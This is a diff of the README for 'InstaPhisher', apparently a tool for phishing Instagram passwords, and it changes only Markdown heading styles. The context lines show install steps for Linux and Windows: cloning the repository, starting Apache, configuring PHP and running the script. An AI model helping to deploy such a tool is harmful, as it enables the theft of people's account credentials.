@@ -28,7 +28,8 @@ The InstaPhisher file is only used to notify you when a new password is captured
 
 # Install
 
-### Linux
+Linux
+-----
 
 ```
 git clone https://github.com/ExilasP/InstaPhisher.git
@@ -40,10 +41,10 @@ service apache2 start
 python InstaPhisher.py
 ```
 
-### Windwos
+Windwos
+-------
 
-Apache and Php download and configuration
------------------------------------------
+## Apache and Php download and configuration
 
 video tutorial: https://www.youtube.com/watch?v=vb0vQYoeWt0
 
@@ -104,8 +105,7 @@ LoadModule php7_module "C:/php/php7apache2_4.dll"
 AddHandler application/x-httpd-php .php
 ```
 
-InstaPhisher download
----------------------
+## InstaPhisher download
 
 1. Download InstaPhisher and extract 
 ```
